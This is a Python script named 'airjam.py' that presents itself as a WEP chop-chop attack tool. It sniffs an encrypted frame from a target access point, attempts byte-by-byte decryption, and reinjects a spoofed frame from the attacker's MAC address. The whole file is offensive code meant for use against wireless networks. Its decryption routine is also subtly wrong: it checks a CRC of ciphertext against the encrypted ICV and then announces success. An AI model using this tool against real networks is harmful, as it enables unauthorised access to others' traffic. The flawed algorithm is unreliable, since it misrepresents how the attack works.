#!/usr/bin/env python3
import argparse
from scapy.all import *
import binascii
import zlib
import os
import sys

conf.verb = 0

def parse_args():
    parser = argparse.ArgumentParser(description="airjam.py — Advanced WEP Chop-Chop Attack Tool")
    parser.add_argument("--chop-chop", action="store_true", help="Enable Chop-Chop Attack")
    parser.add_argument("-b", "--bssid", required=True, help="Target BSSID (e.g. 00:11:22:33:44:55)")
    parser.add_argument("-m", "--mac", required=True, help="Your MAC address")
    parser.add_argument("interface", help="Wireless interface in monitor mode")
    args = parser.parse_args()

    if not args.chop_chop:
        parser.error("You must specify --chop-chop to run the attack.")

    return args

def get_wep_packet(interface, bssid):
    print(f"[*] Sniffing for WEP packets from BSSID {bssid}...")
    def filter_pkt(pkt):
        return (
            pkt.haslayer(Dot11) and
            pkt.haslayer(Dot11WEP) and
            pkt.addr2 == bssid and
            pkt.type == 2
        )
    pkt = sniff(iface=interface, lfilter=filter_pkt, count=1)[0]
    print("[+] Captured one WEP-encrypted data packet.")
    return pkt

def decrypt_crc(pkt, attacker_mac):
    wep = pkt[Dot11WEP]
    iv = wep.iv
    key = bytes([int(iv >> 16), int((iv >> 8) & 0xff), int(iv & 0xff)])
    encrypted_data = wep.wepdata
    icv = wep.icv.to_bytes(4, byteorder="little")

    print("[*] Starting Chop-Chop attack on packet...")
    known = b""
    for i in range(len(encrypted_data)-1):
        for guess in range(256):
            test_byte = bytes([encrypted_data[-(i+1)] ^ guess ^ known[-1] if known else guess])
            test_frame = encrypted_data[:-1-i] + test_byte[::-1] + known[::-1]
            test_crc = zlib.crc32(test_frame).to_bytes(4, byteorder="little")
            if test_crc == icv:
                known = test_byte + known
                print(f"[+] Found byte {i+1}: {test_byte.hex()} (total: {known.hex()})")
                break
    plaintext = encrypted_data[:-len(known)] + known
    print(f"[+] Decryption successful. Decrypted payload: {plaintext.hex()}")
    return plaintext

def reinject_packet(original_pkt, decrypted_data, attacker_mac, iface):
    print("[*] Reinjecting decrypted packet...")
    new_pkt = RadioTap()/Dot11(
        type=2, subtype=0,
        addr1=original_pkt.addr1,
        addr2=attacker_mac,
        addr3=original_pkt.addr3
    )/LLC()/SNAP()/Raw(load=decrypted_data)
    sendp(new_pkt, iface=iface, count=3, inter=0.1)
    print("[+] Packet reinjected.")

def main():
    if os.geteuid() != 0:
        print("[-] Please run as root.")
        sys.exit(1)

    args = parse_args()

    if args.chop_chop:
        pkt = get_wep_packet(args.interface, args.bssid)
        decrypted = decrypt_crc(pkt, args.mac)
        reinject_packet(pkt, decrypted, args.mac, args.interface)

if __name__ == "__main__":
    main()
